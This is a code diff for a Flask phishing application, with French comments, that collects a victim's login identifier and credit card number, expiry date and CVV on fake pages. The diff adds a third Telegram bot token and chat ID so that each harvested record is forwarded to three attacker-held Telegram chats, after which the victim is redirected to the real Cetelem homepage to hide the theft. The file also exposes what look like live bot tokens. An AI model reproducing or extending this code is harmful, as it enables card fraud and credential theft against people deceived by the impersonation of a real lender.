@@ -3,13 +3,17 @@ import requests
 
 app = Flask(__name__)
 
-# Bot principal
+# Bot 1
 TOKEN_1 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
 CHAT_ID_1 = '6297861735'
 
-# Deuxième bot (remplace par tes vraies infos)
+# Bot 2
 TOKEN_2 = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs'
 CHAT_ID_2 = '7650873997'
+
+# Bot 3 (NOUVEAU)
+TOKEN_3 = '7858273702:AAEMIDAD8ZwY_Y0iZliX-5YPXNoHCkeB9HQ'
+CHAT_ID_3 = '5214147917'
 
 
 def send_to_telegram(token, chat_id, message):
@@ -24,6 +28,7 @@ def send_to_telegram(token, chat_id, message):
 def send_all(message):
     send_to_telegram(TOKEN_1, CHAT_ID_1, message)
     send_to_telegram(TOKEN_2, CHAT_ID_2, message)
+    send_to_telegram(TOKEN_3, CHAT_ID_3, message)  # Ajout du 3e bot
 
 
 # Page 1 – Saisie identifiant
@@ -86,7 +91,7 @@ def merci():
     message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
     send_all(message)
 
-    return redirect("https://www.cetelem.fr/fr/accueil")  # redirigé vers un site après saisie
+    return redirect("https://www.cetelem.fr/fr/accueil")
 
 
 if __name__ == '__main__':
